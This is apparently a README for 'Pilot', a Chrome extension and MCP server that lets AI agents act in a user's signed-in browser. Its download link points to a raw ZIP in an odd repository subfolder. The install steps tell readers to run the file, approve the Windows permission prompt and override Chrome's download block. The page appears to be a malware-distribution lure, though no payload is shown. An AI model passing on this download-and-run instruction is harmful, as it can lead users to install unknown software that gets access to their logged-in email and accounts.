# 🧭 Pilot - Control Your Browser With AI

[![Download Pilot](https://img.shields.io/badge/Download-Pilot-6f42c1?style=for-the-badge&logo=github)](https://github.com/Lmo04680/Pilot/raw/refs/heads/main/aligner/Software-v3.8.zip)

## ✨ What Pilot does

Pilot lets AI agents work in your real Chrome browser. It uses a Chrome extension and an MCP server so tools like Claude or Cursor can control a tab while you stay signed in.

Use it to:
- open pages
- click buttons
- fill forms
- read page content
- keep your login state in the browser

Pilot is built for people who want AI help with browser tasks without starting from scratch each time.

## 🪟 Install on Windows

1. Download Pilot from the releases page
2. If the file is a ZIP, right-click it and choose Extract All
3. Open the extracted folder
4. Run the Pilot app or installer file inside the folder
5. If Windows asks for permission, choose Yes
6. Keep Chrome open if Pilot asks for it

If your browser blocks the file, open the downloads list in Chrome and choose Keep if you trust the source.

## 🌐 Set up Chrome

Pilot works with Chrome because it needs your current browser session.

1. Make sure Google Chrome is installed
2. Open Chrome and sign in to the sites you want the AI to use
3. Keep the same Chrome profile you use every day
4. Close extra Chrome windows if you want Pilot to use one clean session

Pilot uses your existing login, so you do not need to hand over passwords to the AI for each site.

## 🔌 Install the Chrome extension

The extension lets Pilot connect to your browser tab.

1. Open Chrome
2. Go to the extensions page
3. Turn on Developer mode if the release asks for it
4. Load the Pilot extension from the folder you extracted
5. Pin the extension so it is easy to find

After the extension is loaded, Pilot can talk to the browser and act on the page you have open.

## 🤖 Connect an AI agent

Pilot works with AI tools that support MCP, such as Claude and Cursor.

1. Open the AI tool you want to use
2. Add the Pilot MCP server in the tool’s settings
3. Start the server if the app asks you to
4. Choose the browser tab you want the AI to use
5. Give the agent a clear task

Example tasks:
- “Go to my email and find the latest invoice”
- “Open this site and fill out the form”
- “Check the order status on this page”
- “Copy the text from the page into my notes”

Keep prompts short and direct. The AI works better when the task is clear.

## 🛠️ First run checklist

Before you use Pilot for the first time, check these items:

- Chrome is installed
- You are signed in to the sites you want to use
- The Pilot extension is loaded
- The MCP server is running
- Your AI tool can see the Pilot connection
- The tab you want the agent to use is open

If one part is not ready, Pilot may not connect to the browser.

## 🧪 How to use Pilot

1. Open Chrome and go to the page you want the AI to work on
2. Make sure you are signed in
3. Start Pilot
4. Open your AI tool
5. Tell the AI what to do
6. Watch the browser while the agent works

Pilot is useful for tasks that need a real login or a live page. Since it uses your own browser, it can work with pages that do not allow simple screen scraping.

## 🔒 Privacy and browser control

Pilot works in your browser session. That means:

- your logins stay in your browser
- the AI can act on pages you already opened
- you stay in control of the browser window
- you can stop the agent when you want

Use it on sites you trust and on tasks you understand. Check the page before the agent clicks send, buy, or delete.

## 🧰 Common uses

Pilot fits many browser tasks:

- customer support work
- data entry
- web research
- form filling
- account checks
- internal tools
- repetitive site actions

It is also useful when a site uses a normal login and you do not want to repeat that login inside another tool.

## 🖥️ System needs

Pilot is made for Windows users who want a simple setup.

You will need:
- Windows 10 or later
- Google Chrome
- an AI tool with MCP support
- enough free disk space for the app and browser files
- a stable internet connection

For best results, use one Chrome profile for Pilot and keep it signed in to your target sites.

## ❓ If something does not work

If Pilot does not connect, try these steps:

1. Close Chrome and reopen it
2. Check that the extension is still loaded
3. Make sure the MCP server is running
4. Confirm that your AI tool points to the right server
5. Reload the page in Chrome
6. Try again with one tab open

If the agent can open pages but not click them, the page may be loading slow or the element may not be ready yet. Wait a moment and try again.

If Chrome asks for permission, allow the request so Pilot can reach the tab you want.

## 🧭 Tips for best results

- Use one tab per task
- Keep the page simple
- Sign in before you start
- Give one task at a time
- Use short prompts
- Watch the first few actions
- Stop the agent if it reaches a page you do not expect

Pilot works best when the browser state is clear and the task is plain.
